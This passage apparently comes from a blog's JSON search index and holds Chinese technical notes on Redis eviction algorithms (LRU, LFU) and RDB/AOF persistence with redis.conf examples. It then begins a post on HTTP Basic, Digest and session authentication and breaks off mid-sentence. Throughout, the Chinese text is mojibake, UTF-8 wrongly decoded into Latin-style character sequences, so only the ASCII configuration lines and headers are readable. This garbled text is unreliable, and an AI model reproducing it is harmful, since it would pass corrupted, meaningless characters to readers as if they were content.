è¯‘ä¸ºæœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼Œæ˜¯ä¸€ç§å¸¸ç”¨çš„é¡µé¢ç½®æ¢ç®—æ³•ï¼Œé€‰æ‹©æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢äºˆä»¥æ·˜æ±°ã€‚\n\nLRU ç®—æ³•éœ€è¦åŸºäºé“¾è¡¨ç»“æ„ï¼Œé“¾è¡¨ä¸­çš„å…ƒç´ æŒ‰ç…§æ“ä½œé¡ºåºä»å‰å¾€åæ’åˆ—ï¼Œæœ€æ–°æ“ä½œçš„é”®ä¼šè¢«ç§»åŠ¨åˆ°è¡¨å¤´ï¼Œå½“éœ€è¦å†…å­˜æ·˜æ±°æ—¶ï¼Œåªéœ€è¦åˆ é™¤é“¾è¡¨å°¾éƒ¨çš„å…ƒç´ å³å¯ã€‚\n\nLRU ç®—æ³•æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œæ¯”å¦‚è¯´å¾ˆä¹…æ²¡æœ‰ä½¿ç”¨çš„ä¸€ä¸ªé”®å€¼ï¼Œå¦‚æœæœ€è¿‘è¢«è®¿é—®äº†ä¸€æ¬¡ï¼Œé‚£ä¹ˆå®ƒå°±ä¸ä¼šè¢«æ·˜æ±°ï¼Œå³ä½¿å®ƒæ˜¯ä½¿ç”¨æ¬¡æ•°æœ€å°‘çš„ç¼“å­˜ï¼Œé‚£å®ƒä¹Ÿä¸ä¼šè¢«æ·˜æ±°ï¼Œå› æ­¤åœ¨ Redis 4.0 ä¹‹åå¼•å…¥äº† LFU ç®—æ³•ã€‚\n\n##### LFU ç®—æ³•\n\nLFU å…¨ç§°æ˜¯ Least Frequently Used ç¿»è¯‘ä¸ºæœ€ä¸å¸¸ç”¨çš„ï¼Œæœ€ä¸å¸¸ç”¨çš„ç®—æ³•æ˜¯æ ¹æ®æ€»è®¿é—®æ¬¡æ•°æ¥æ·˜æ±°æ•°æ®çš„ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯â€œå¦‚æœæ•°æ®è¿‡å»è¢«è®¿é—®å¤šæ¬¡ï¼Œé‚£ä¹ˆå°†æ¥è¢«è®¿é—®çš„é¢‘ç‡ä¹Ÿæ›´é«˜â€ã€‚\n\nLFU è§£å†³äº†å¶å°”è¢«è®¿é—®ä¸€æ¬¡ä¹‹åï¼Œæ•°æ®å°±ä¸ä¼šè¢«æ·˜æ±°çš„é—®é¢˜ï¼Œç›¸æ¯”äº LRU ç®—æ³•ä¹Ÿæ›´åˆç†ä¸€äº›ã€‚\n\n# 5. Redis æŒä¹…åŒ–\n\n### 5.1 RDB(äºŒè¿›åˆ¶å¿«ç…§)\n\nRDB å°±æ˜¯ Redis DataBase çš„ç¼©å†™ï¼Œä¸­æ–‡åä¸ºå¿«ç…§/å†…å­˜å¿«ç…§ï¼ŒRDBæŒä¹…åŒ–æ˜¯æŠŠå½“å‰è¿›ç¨‹æ•°æ®ç”Ÿæˆå¿«ç…§ä¿å­˜åˆ°ç£ç›˜ä¸Šçš„è¿‡ç¨‹ï¼Œç”±äºæ˜¯æŸä¸€æ—¶åˆ»çš„å¿«ç…§ï¼Œé‚£ä¹ˆå¿«ç…§ä¸­çš„å€¼è¦æ—©äºæˆ–è€…ç­‰äºå†…å­˜ä¸­çš„å€¼ã€‚\n\n##### æ‰‹åŠ¨è§¦å‘\n\n+ saveå‘½ä»¤ï¼šé˜»å¡å½“å‰RedisæœåŠ¡å™¨ï¼Œç›´åˆ°RDBè¿‡ç¨‹å®Œæˆä¸ºæ­¢ï¼Œå¯¹äºå†…å­˜ æ¯”è¾ƒå¤§çš„å®ä¾‹ä¼šé€ æˆé•¿æ—¶é—´é˜»å¡ï¼Œçº¿ä¸Šç¯å¢ƒä¸å»ºè®®ä½¿ç”¨\n\n+ bgsaveå‘½ä»¤ï¼šRedisè¿›ç¨‹æ‰§è¡Œforkæ“ä½œåˆ›å»ºå­è¿›ç¨‹ï¼ŒRDBæŒä¹…åŒ–è¿‡ç¨‹ç”±å­ è¿›ç¨‹è´Ÿè´£ï¼Œå®Œæˆåè‡ªåŠ¨ç»“æŸã€‚é˜»å¡åªå‘ç”Ÿåœ¨forké˜¶æ®µï¼Œä¸€èˆ¬æ—¶é—´å¾ˆçŸ­\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230830155731890.png\" alt=\"image-20230830155731890\" style=\"zoom:50%;\" />\n\n##### è‡ªåŠ¨è§¦å‘\n\n- redis.confä¸­é…ç½®`save m n`ï¼Œå³åœ¨mç§’å†…æœ‰næ¬¡ä¿®æ”¹æ—¶ï¼Œè‡ªåŠ¨è§¦å‘bgsaveç”Ÿæˆrdbæ–‡ä»¶ï¼›\n- ä¸»ä»å¤åˆ¶æ—¶ï¼Œä»èŠ‚ç‚¹è¦ä»ä¸»èŠ‚ç‚¹è¿›è¡Œå…¨é‡å¤åˆ¶æ—¶ä¹Ÿä¼šè§¦å‘bgsaveæ“ä½œï¼Œç”Ÿæˆå½“æ—¶çš„å¿«ç…§å‘é€åˆ°ä»èŠ‚ç‚¹ï¼›\n- æ‰§è¡Œdebug reloadå‘½ä»¤é‡æ–°åŠ è½½redisæ—¶ä¹Ÿä¼šè§¦å‘bgsaveæ“ä½œï¼›\n- é»˜è®¤æƒ…å†µä¸‹æ‰§è¡Œshutdownå‘½ä»¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯aofæŒä¹…åŒ–ï¼Œé‚£ä¹ˆä¹Ÿä¼šè§¦å‘bgsaveæ“ä½œï¼›\n\n\n\n```shell\n# é»˜è®¤çš„è®¾ç½®ä¸ºï¼š\nsave 900 1              #åœ¨900ç§’(15åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰1ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼Œ\nsave 300 10             #åœ¨300ç§’(5åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰10ä¸ªkeyå‘ç”Ÿå˜åŒ–\nsave 60 10000       \t  #åœ¨60ç§’(1åˆ†é’Ÿ)ä¹‹åï¼Œè‡³å°‘æœ‰10000ä¸ªkeyå‘ç”Ÿå˜åŒ–\n```\n\n\n\n##### å¿«ç…§æ•°æ®ä¸€è‡´æ€§\n\nå°†å†…å­˜ä¸­çš„æ•°æ®åŒæ­¥åˆ°ç¡¬ç›˜çš„è¿‡ç¨‹å¯èƒ½å°±ä¼šæŒç»­æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œè€Œå®é™…æƒ…å†µæ˜¯è¿™æ®µæ—¶é—´RedisæœåŠ¡ä¸€èˆ¬éƒ½ä¼šæ”¶åˆ°æ•°æ®å†™æ“ä½œè¯·æ±‚ã€‚é‚£ä¹ˆå¦‚ä½•ä¿è¯æ•°æ®ä¸€è‡´æ€§å‘¢ï¼ŸRDBä¸­çš„æ ¸å¿ƒæ€è·¯æ˜¯Copy-on-Writeã€‚\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230830160712880.png\" alt=\"image-20230830160712880\" style=\"zoom:50%;\" />\n\nå¦‚æœä¸»çº¿ç¨‹å¯¹è¿™äº›æ•°æ®ä¹Ÿéƒ½æ˜¯è¯»æ“ä½œï¼ˆä¾‹å¦‚å›¾ä¸­çš„é”®å€¼å¯¹ Aï¼‰ï¼Œé‚£ä¹ˆï¼Œä¸»çº¿ç¨‹å’Œ bgsave å­è¿›ç¨‹ç›¸äº’ä¸å½±å“ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸»çº¿ç¨‹è¦ä¿®æ”¹ä¸€å—æ•°æ®ï¼ˆä¾‹å¦‚å›¾ä¸­çš„é”®å€¼å¯¹ Cï¼‰ï¼Œé‚£ä¹ˆï¼Œè¿™å—æ•°æ®å°±ä¼šè¢«å¤åˆ¶ä¸€ä»½ï¼Œç”Ÿæˆè¯¥æ•°æ®çš„å‰¯æœ¬ã€‚ç„¶åï¼Œbgsave å­è¿›ç¨‹ä¼šæŠŠè¿™ä¸ªå‰¯æœ¬æ•°æ®å†™å…¥ RDB æ–‡ä»¶ï¼Œè€Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸»çº¿ç¨‹ä»ç„¶å¯ä»¥ç›´æ¥ä¿®æ”¹åŸæ¥çš„æ•°æ®ã€‚\n\n##### å¯ä»¥æ¯ç§’åšä¸€æ¬¡å¿«ç…§å—\n\nè¿™ç§æƒ³æ³•å…¶å®æ˜¯é”™è¯¯çš„ã€‚è™½ç„¶ bgsave æ‰§è¡Œæ—¶ä¸é˜»å¡ä¸»çº¿ç¨‹ï¼Œä½†æ˜¯å¦‚æœé¢‘ç¹åœ°æ‰§è¡Œå…¨é‡å¿«ç…§ï¼Œä¹Ÿä¼šå¸¦æ¥ä¸¤æ–¹é¢çš„å¼€é”€ï¼š\n\n- ä¸€æ–¹é¢ï¼Œé¢‘ç¹å°†å…¨é‡æ•°æ®å†™å…¥ç£ç›˜ï¼Œä¼šç»™ç£ç›˜å¸¦æ¥å¾ˆå¤§å‹åŠ›ï¼Œå¤šä¸ªå¿«ç…§ç«äº‰æœ‰é™çš„ç£ç›˜å¸¦å®½ï¼Œå‰ä¸€ä¸ªå¿«ç…§è¿˜æ²¡æœ‰åšå®Œï¼Œåä¸€ä¸ªåˆå¼€å§‹åšäº†ï¼Œå®¹æ˜“é€ æˆæ¶æ€§å¾ªç¯ã€‚\n- å¦ä¸€æ–¹é¢ï¼Œbgsave å­è¿›ç¨‹éœ€è¦é€šè¿‡ fork æ“ä½œä»ä¸»çº¿ç¨‹åˆ›å»ºå‡ºæ¥ã€‚è™½ç„¶ï¼Œå­è¿›ç¨‹åœ¨åˆ›å»ºåä¸ä¼šå†é˜»å¡ä¸»çº¿ç¨‹ï¼Œä½†æ˜¯ï¼Œfork è¿™ä¸ªåˆ›å»ºè¿‡ç¨‹æœ¬èº«ä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼Œè€Œä¸”ä¸»çº¿ç¨‹çš„å†…å­˜è¶Šå¤§ï¼Œé˜»å¡æ—¶é—´è¶Šé•¿ã€‚å¦‚æœé¢‘ç¹ fork å‡º bgsave å­è¿›ç¨‹ï¼Œè¿™å°±ä¼šé¢‘ç¹é˜»å¡ä¸»çº¿ç¨‹äº†ã€‚\n\n##### RDBçš„ä¼˜ç¼ºç‚¹\n\n- **ä¼˜ç‚¹**\n  - RDBæ–‡ä»¶æ˜¯æŸä¸ªæ—¶é—´èŠ‚ç‚¹çš„å¿«ç…§ï¼Œé»˜è®¤ä½¿ç”¨LZFç®—æ³•è¿›è¡Œå‹ç¼©ï¼Œå‹ç¼©åçš„æ–‡ä»¶ä½“ç§¯è¿œè¿œå°äºå†…å­˜å¤§å°ï¼Œé€‚ç”¨äºå¤‡ä»½ã€å…¨é‡å¤åˆ¶ç­‰åœºæ™¯ï¼›\n  - RedisåŠ è½½RDBæ–‡ä»¶æ¢å¤æ•°æ®è¦è¿œè¿œå¿«äºAOFæ–¹å¼ï¼›\n- **ç¼ºç‚¹**\n  - RDBæ–¹å¼å®æ—¶æ€§ä¸å¤Ÿï¼Œæ— æ³•åšåˆ°ç§’çº§çš„æŒä¹…åŒ–ï¼›\n  - æ¯æ¬¡è°ƒç”¨bgsaveéƒ½éœ€è¦forkå­è¿›ç¨‹ï¼Œforkå­è¿›ç¨‹å±äºé‡é‡çº§æ“ä½œï¼Œé¢‘ç¹æ‰§è¡Œæˆæœ¬è¾ƒé«˜ï¼›\n  - RDBæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶çš„ï¼Œæ²¡æœ‰å¯è¯»æ€§ï¼ŒAOFæ–‡ä»¶åœ¨äº†è§£å…¶ç»“æ„çš„æƒ…å†µä¸‹å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹æˆ–è€…è¡¥å…¨ï¼›\n  - ç‰ˆæœ¬å…¼å®¹RDBæ–‡ä»¶é—®é¢˜ï¼›\n\né’ˆå¯¹RDBä¸é€‚åˆå®æ—¶æŒä¹…åŒ–çš„é—®é¢˜ï¼ŒRedisæä¾›äº†AOFæŒä¹…åŒ–æ–¹å¼æ¥è§£å†³ã€‚\n\n### 5.2 AOF ï¼ˆå‘½ä»¤è¿½åŠ ï¼‰\n\nRedisæ˜¯â€œå†™åâ€æ—¥å¿—ï¼ŒRediså…ˆæ‰§è¡Œå‘½ä»¤ï¼ŒæŠŠæ•°æ®å†™å…¥å†…å­˜ï¼Œç„¶åæ‰è®°å½•æ—¥å¿—ã€‚AOFæ—¥å¿—è®°å½•Redisçš„æ¯ä¸ªå†™å‘½ä»¤ï¼Œæ­¥éª¤åˆ†ä¸ºï¼šå‘½ä»¤è¿½åŠ ï¼ˆappendï¼‰ã€æ–‡ä»¶å†™å…¥ï¼ˆwriteï¼‰å’Œæ–‡ä»¶åŒæ­¥ï¼ˆsyncï¼‰ã€‚\n\n##### å‘½ä»¤è¿½åŠ \n\nå½“AOFæŒä¹…åŒ–åŠŸèƒ½æ‰“å¼€äº†ï¼ŒæœåŠ¡å™¨åœ¨æ‰§è¡Œå®Œä¸€ä¸ªå†™å‘½ä»¤ä¹‹åï¼Œä¼šä»¥åè®®æ ¼å¼å°†è¢«æ‰§è¡Œçš„å†™å‘½ä»¤è¿½åŠ åˆ°æœåŠ¡å™¨çš„ aof_buf ç¼“å†²åŒºã€‚\n\n##### æ–‡ä»¶å†™å…¥å’Œæ–‡ä»¶åŒæ­¥\n\nå…³äºä½•æ—¶å°† aof_buf ç¼“å†²åŒºçš„å†…å®¹å†™å…¥AOFæ–‡ä»¶ä¸­ï¼ŒRedisæä¾›äº†ä¸‰ç§å†™å›ç­–ç•¥ï¼š\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230830161413607.png\" alt=\"image-20230830161413607\" style=\"zoom:50%;\" />\n\n\n```shell\nappendfsync always     # æ¯æ¬¡æœ‰æ•°æ®ä¿®æ”¹å‘ç”Ÿæ—¶éƒ½ä¼šå†™å…¥AOFæ–‡ä»¶ã€‚\nappendfsync everysec   # æ¯ç§’é’ŸåŒæ­¥ä¸€æ¬¡ï¼Œè¯¥ç­–ç•¥ä¸ºAOFçš„é»˜è®¤ç­–ç•¥ã€‚\nappendfsync no         # æ¯ä¸ªå†™å‘½ä»¤æ‰§è¡Œå®Œï¼Œåªæ˜¯å…ˆæŠŠæ—¥å¿—å†™åˆ°AOFæ–‡ä»¶çš„å†…å­˜ç¼“å†²åŒºï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶å°†ç¼“å†²åŒºå†…å®¹å†™å›ç£ç›˜ã€‚\n```\n\n##### AOFé…ç½®\n\né»˜è®¤æƒ…å†µä¸‹ï¼ŒRedisæ˜¯æ²¡æœ‰å¼€å¯AOFçš„ï¼Œå¯ä»¥é€šè¿‡é…ç½®redis.confæ–‡ä»¶æ¥å¼€å¯AOFæŒä¹…åŒ–ã€‚\n\n```bash\n# appendonlyå‚æ•°å¼€å¯AOFæŒä¹…åŒ–\nappendonly no\n\n# AOFæŒä¹…åŒ–çš„æ–‡ä»¶åï¼Œé»˜è®¤æ˜¯appendonly.aof\nappendfilename \"appendonly.aof\"\n\n# AOFæ–‡ä»¶çš„ä¿å­˜ä½ç½®å’ŒRDBæ–‡ä»¶çš„ä½ç½®ç›¸åŒï¼Œéƒ½æ˜¯é€šè¿‡dirå‚æ•°è®¾ç½®çš„\ndir ./\n\n# åŒæ­¥ç­–ç•¥\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n# aofé‡å†™æœŸé—´æ˜¯å¦åŒæ­¥\nno-appendfsync-on-rewrite no\n\n# é‡å†™è§¦å‘é…ç½®\nauto-aof-rewrite-percentage 100  #æ„æ€å°±æ˜¯å¦‚æœAOFæ–‡ä»¶çš„å¤§å°è¶…è¿‡ä¸Šæ¬¡AOFæ–‡ä»¶é‡å†™åçš„1å€ï¼Œå°±å¯åŠ¨é‡å†™æ“ä½œã€‚\nauto-aof-rewrite-min-size 64mb  #å¦‚æœAOFæ–‡ä»¶å¤§å°ä½äºè¿™ä¸ªå€¼ï¼Œåˆ™ä¸ä¼šè§¦å‘é‡å†™æ“ä½œ\n\n# åŠ è½½aofå‡ºé”™å¦‚ä½•å¤„ç†\naof-load-truncated yes\n\n# æ–‡ä»¶é‡å†™ç­–ç•¥\naof-rewrite-incremental-fsync yes\n```\n\n\n\n##### AOFé‡å†™\n\nRedisé•¿æ—¶é—´è¿è¡Œï¼Œå‘½ä»¤ä¸æ–­å†™å…¥AOFï¼Œæ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ï¼Œä¸åŠ æ§åˆ¶å¯èƒ½å½±å“å®¿ä¸»æœºçš„å®‰å…¨ã€‚ä¸ºäº†è§£å†³AOFæ–‡ä»¶ä½“ç§¯é—®é¢˜ï¼ŒRediså¼•å…¥äº†AOFæ–‡ä»¶é‡å†™åŠŸèƒ½ï¼Œå®ƒä¼šæ ¹æ®Rediså†…æ•°æ®å¯¹è±¡çš„æœ€æ–°çŠ¶æ€ç”Ÿæˆæ–°çš„AOFæ–‡ä»¶ï¼Œæ–°æ—§æ–‡ä»¶å¯¹åº”çš„æ•°æ®çŠ¶æ€ä¸€è‡´ã€‚\n\nRedisé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„AOFæ–‡ä»¶æ¥æ›¿æ¢ç°æœ‰çš„AOFï¼Œæ–°æ—§ä¸¤ä¸ªAOFæ–‡ä»¶ä¿å­˜çš„æ•°æ®ç›¸åŒï¼Œä½†æ–°AOFæ–‡ä»¶æ²¡æœ‰äº†å†—ä½™å‘½ä»¤ã€‚ï¼ˆä¼˜é›…ï¼ï¼‰\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230830162217305.png\" alt=\"image-20230830162217305\" style=\"zoom:50%;\" />\n\nAOFæ–‡ä»¶å¤ªå¤§æ—¶ä¼šè§¦å‘AOFæ–‡ä»¶é‡å†™ï¼Œé‚£åˆ°åº•æ˜¯å¤šå¤§å‘¢ï¼Ÿæœ‰å“ªäº›æƒ…å†µä¼šè§¦å‘é‡å†™æ“ä½œå‘¢ï¼Ÿ\n\n- auto-aof-rewrite-percentageï¼šä»£è¡¨å½“å‰AOFæ–‡ä»¶å¤§å°ï¼ˆaof_current_sizeï¼‰å’Œä¸Šä¸€æ¬¡é‡å†™åAOFæ–‡ä»¶å¤§å°ï¼ˆaof_base_sizeï¼‰ç›¸æ¯”ï¼Œå¢é•¿çš„æ¯”ä¾‹ã€‚\n- auto-aof-rewrite-min-sizeï¼šè¡¨ç¤ºè¿è¡Œ`BGREWRITEAOF`æ—¶AOFæ–‡ä»¶å ç”¨ç©ºé—´æœ€å°å€¼ï¼Œé»˜è®¤ä¸º64MBï¼›\n\n\n\n### 5.3 RDBå’ŒAOFæ··åˆæ–¹å¼\n\nRedis 4.0 ä¸­æå‡ºäº†ä¸€ä¸ªæ··åˆä½¿ç”¨ AOF æ—¥å¿—å’Œå†…å­˜å¿«ç…§çš„æ–¹æ³•ã€‚ç®€å•æ¥è¯´ï¼Œå†…å­˜å¿«ç…§ä»¥ä¸€å®šçš„é¢‘ç‡æ‰§è¡Œï¼Œåœ¨ä¸¤æ¬¡å¿«ç…§ä¹‹é—´ï¼Œä½¿ç”¨ AOF æ—¥å¿—è®°å½•è¿™æœŸé—´çš„æ‰€æœ‰å‘½ä»¤æ“ä½œã€‚\n\nè¿™æ ·ä¸€æ¥ï¼Œå¿«ç…§ä¸ç”¨å¾ˆé¢‘ç¹åœ°æ‰§è¡Œï¼Œè¿™å°±é¿å…äº†é¢‘ç¹ fork å¯¹ä¸»çº¿ç¨‹çš„å½±å“ã€‚è€Œä¸”ï¼ŒAOF æ—¥å¿—ä¹Ÿåªç”¨è®°å½•ä¸¤æ¬¡å¿«ç…§é—´çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸éœ€è¦è®°å½•æ‰€æœ‰æ“ä½œäº†ï¼Œå› æ­¤ï¼Œå°±ä¸ä¼šå‡ºç°æ–‡ä»¶è¿‡å¤§çš„æƒ…å†µäº†ï¼Œä¹Ÿå¯ä»¥é¿å…é‡å†™å¼€é”€ã€‚\n\n<img src=\"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–/image-20230830162806365.png\" alt=\"image-20230830162806365\" style=\"zoom:50%;\" />\n\nT1 å’Œ T2 æ—¶åˆ»çš„ä¿®æ”¹ï¼Œç”¨ AOF æ—¥å¿—è®°å½•ï¼Œç­‰åˆ°ç¬¬äºŒæ¬¡åšå…¨é‡å¿«ç…§æ—¶ï¼Œå°±å¯ä»¥æ¸…ç©º AOF æ—¥å¿—ï¼Œå› ä¸ºæ­¤æ—¶çš„ä¿®æ”¹éƒ½å·²ç»è®°å½•åˆ°å¿«ç…§ä¸­äº†ï¼Œæ¢å¤æ—¶å°±ä¸å†ç”¨æ—¥å¿—äº†ã€‚\n\n**é…ç½®**\n\n```bash\naof-use-rdb-preamble çš„å€¼æ˜¯ï¼š\n\n- noï¼šæŒ‰ç…§AOFæ ¼å¼å†™å…¥å‘½ä»¤ï¼Œä¸4.0å‰ç‰ˆæœ¬æ— å·®åˆ«ï¼›\n- yesï¼šå…ˆæŒ‰ç…§RDBæ ¼å¼å†™å…¥æ•°æ®çŠ¶æ€ï¼Œç„¶åæŠŠé‡å†™æœŸé—´AOFç¼“å†²åŒºçš„å†…å®¹ä»¥AOFæ ¼å¼å†™å…¥ï¼Œæ–‡ä»¶å‰åŠéƒ¨åˆ†ä¸ºRDBæ ¼å¼ï¼ŒååŠéƒ¨åˆ†ä¸ºAOFæ ¼å¼ã€‚\n```\n\nåœ¨AOFæ–¹å¼ä¸‹ï¼Œ**å¼€å¯æ··åˆæŒä¹…åŒ–æœºåˆ¶ç”Ÿæˆçš„æ–‡ä»¶æ˜¯â€œRDBå¤´+AOFå°¾â€ï¼Œæœªå¼€å¯æ—¶ç”Ÿæˆçš„æ–‡ä»¶å…¨éƒ¨ä¸ºAOFæ ¼å¼ã€‚**è€ƒè™‘ä¸¤ç§æ–‡ä»¶æ ¼å¼çš„å…¼å®¹æ€§ï¼Œå¦‚æœRediså‘ç°AOFæ–‡ä»¶ä¸ºRDBå¤´ï¼Œä¼šä½¿ç”¨RDBæ•°æ®åŠ è½½çš„æ–¹æ³•è¯»å–å¹¶æ¢å¤å‰åŠéƒ¨åˆ†ï¼›ç„¶åå†ä½¿ç”¨AOFæ–¹å¼è¯»å–å¹¶æ¢å¤ååŠéƒ¨åˆ†ã€‚ç”±äºAOFæ ¼å¼å­˜å‚¨çš„æ•°æ®ä¸ºRESPåè®®å‘½ä»¤ï¼ŒRedisé‡‡ç”¨ä¼ªå®¢æˆ·ç«¯æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼æ¥æ¢å¤æ•°æ®ã€‚\n\n# 6. å¤´è„‘é£æš´\n\n+ åˆ é™¤æœºåˆ¶ï¼šå®šæœŸ+æƒ°æ€§åˆ é™¤æœºåˆ¶ã€‚æ·˜æ±°æœºåˆ¶ï¼šä¸æ·˜æ±°+è¿‡æœŸkeyçš„æ·˜æ±°+æ‰€æœ‰keyçš„æ·˜æ±°ï¼Œç»„åˆã€‚LRUå’ŒLFUç®—æ³•æœºåˆ¶ã€‚\n+ rdbæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶å°±ï¼Œsaveå’Œbgsaveè§¦å‘æˆ–è€…é…ç½®æ–‡ä»¶è‡ªåŠ¨è§¦å‘ã€‚AOFæ˜¯å‘½ä»¤è¿½åŠ åˆ°ç¼“å†²åŒºã€‚4.0åå¯ä»¥æ··åˆRDBå¤´+AOFå°¾ã€‚\n\n# 7. å‚è€ƒèµ„æ–™\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n+ https://pdai.tech/md/db/nosql-redis/db-redis-x-rdb-aof.html\n+ https://segmentfault.com/a/1190000039208726\n+ https://www.pdai.tech/md/db/nosql-redis/db-redis-x-redis-ds.html\n+ https://www.jianshu.com/p/9d8296562806\n\n","tags":["redis"],"categories":["redis"]},{"title":"httpå¸¸è§çš„è®¤è¯æ–¹å¼","url":"%2Fp%2Fb6a04976.html","content":"\n# 1. http basicè®¤è¯\n\nHttpBasicè®¤è¯æ˜¯Httpè‡ªå¸¦çš„è®¤è¯æ–¹å¼ï¼Œè¿™ç§è®¤è¯æ–¹å¼é€šå¸¸è¡¨ç°ä¸ºæµè§ˆå™¨å¼¹å‡ºAlertçª—å£æç¤ºè¾“å…¥ç”¨æˆ·å/å¯†ç ã€‚\n\n<!-- more -->\n\nå…¶äº¤äº’è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n1. å¼€å§‹æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€æœªæºå¸¦èº«ä»½ä¿¡æ¯çš„è¯·æ±‚ã€‚\n2. æœåŠ¡ç«¯è¿”å› 401 Unauthorized çŠ¶æ€ï¼Œå¹¶åœ¨è¿”å›å¤´ä¸­è¯´æ˜è¦ç”¨ `Basic` æ–¹æ³•è¿›è¡Œè®¤è¯ï¼š `WWW-Authenticate: Basic`ã€‚\n3. å®¢æˆ·ç«¯é‡æ–°å‘é€è¯·æ±‚ï¼Œå¹¶å°†èº«ä»½ä¿¡æ¯åŒ…å«åœ¨è¯·æ±‚å¤´ä¸­: `Authorization: Basic aHk6bXlwYXNzd29yZA==`ã€‚\n4. æœåŠ¡ç«¯éªŒè¯è¯·æ±‚å¤´ä¸­çš„èº«ä»½ä¿¡æ¯ï¼Œå¹¶ç›¸åº”è¿”å› 200 OK æˆ– 403 Forbidden çŠ¶æ€ã€‚\n5. ä¹‹åï¼Œå®¢æˆ·ç«¯æ¯æ¬¡å‘é€è¯·æ±‚éƒ½åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦è¯¥èº«ä»½ä¿¡æ¯ã€‚\n\n<img src=\"http%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F/image-20220328164243552.png\" alt=\"image-20220328164243552\" style=\"zoom:50%;\" />\n\n\n\nå…¶ä¸­ä¼ é€çš„èº«ä»½ä¿¡æ¯æ˜¯ `<username>:<password>` ç» base64 ç¼–ç åçš„å­—ä¸²ã€‚å¦‚æœ¬ä¾‹ä¸­çš„ `aHk6bXlwYXNzd29yZA==`ï¼Œ ç» base64 è§£ç åä¸º `hy:mypassword`ã€‚\n\nè¿™ç§è®¤è¯æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯ç®€å•ï¼Œå®¹æ˜“ç†è§£ã€‚\n\nç¼ºç‚¹æœ‰ï¼š\n\n- ä¸å®‰å…¨ï¼šè®¤è¯èº«ä»½ä¿¡æ¯ç”¨æ˜æ–‡ä¼ é€ï¼Œå› æ­¤éœ€ç»“åˆ https ä½¿ç”¨ã€‚\n- æ•ˆç‡ä½ï¼šæœåŠ¡ç«¯å¤„ç†è¯·æ±‚æ—¶ï¼Œæ¯æ¬¡éƒ½éœ€è¦éªŒè¯èº«ä»½ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åå’Œå¯†ç ã€‚\n\n### 1.1 http digestè®¤è¯\n\nHttpBasicè®¤è¯å¾ˆå°‘åœ¨å¯å…¬å¼€è®¿é—®çš„äº’è”ç½‘ç½‘ç«™ä¸Šä½¿ç”¨ï¼Œæœ‰æ—¶å€™ä¼šåœ¨å°çš„ç§æœ‰ç³»ç»Ÿä¸­ä½¿ç”¨ï¼ˆå¦‚è·¯ç”±å™¨ç½‘é¡µç®¡ç†æ¥å£ï¼‰ã€‚\n\ndigestè®¤è¯æ˜¯å¦ä¸€ç§HTTPè®¤è¯åè®®ï¼Œå®ƒè¯•å›¾ä¿®å¤åŸºæœ¬è®¤è¯åè®®çš„ä¸¥é‡ç¼ºé™·ã€‚å…·ä½“æ¥è¯´ï¼Œæ‘˜è¦è®¤è¯è¿›è¡Œäº†å¦‚ä¸‹æ”¹è¿›ï¼šæ°¸è¿œä¸ä¼šä»¥æ˜æ–‡æ–¹å¼åœ¨ç½‘ç»œä¸Šå‘é€å¯†ç ï¼›å¯ä»¥é˜²æ­¢æ¶æ„ç”¨æˆ·æ•è·å¹¶é‡æ”¾è®¤è¯çš„æ¡æ‰‹è¿‡ç¨‹ï¼›å¯ä»¥æœ‰é€‰æ‹©åœ°é˜²æ­¢å¯¹æŠ¥æ–‡å†…å®¹çš„ç¯¡æ”¹ï¼›é˜²èŒƒå…¶ä»–å‡ ç§å¸¸è§çš„æ”»å‡»æ–¹å¼\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdigestè®¤è¯é™¤äº†èƒ½å¤Ÿä¿æŠ¤å¯†ç ä¹‹å¤–ï¼Œå¹¶ä¸èƒ½ä¿æŠ¤å…¶ä»–å†…å®¹ã€‚ä½¿ç”¨ä¼ è¾“å±‚å®‰å…¨(Transport Layer Security, TLS)å’Œå®‰å…¨HTTP(HTTPS)åè®®æ›´ä¸ºåˆé€‚ä¸€äº›ã€‚æ‰€ä»¥è¿„ä»Šä¸ºæ­¢ï¼Œæ‘˜è¦è®¤è¯è¿˜æ²¡æœ‰è¢«å¹¿æ³›åº”ç”¨ã€‚\n\n\n\n# 2. sessionè®¤è¯\n\nè¿™ç§è®¤è¯æ–¹æ³•ç»“åˆäº† Session å’Œ Cookieã€‚æœåŠ¡ç«¯å°†æœ¬æ¬¡ä¼šè¯ä¿¡æ¯ä»¥ Session 